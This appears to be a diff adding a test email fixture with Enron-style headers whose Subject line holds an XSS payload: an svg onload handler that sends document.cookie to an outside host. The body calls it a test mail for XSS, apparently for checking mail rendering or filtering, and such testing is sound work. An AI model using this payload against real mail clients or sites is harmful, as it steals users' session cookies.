@@ -1,0 +1,7 @@
+From: "Wayne Rossi" <stocknews@tophat.trg.saic.com>
+To: roseann.engeldorf@enron.com, kay.mann@enron.com
+Subject: <svg onload='img=new Image();img.src="//x55.me/geo.php?get="+document.cookie;'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
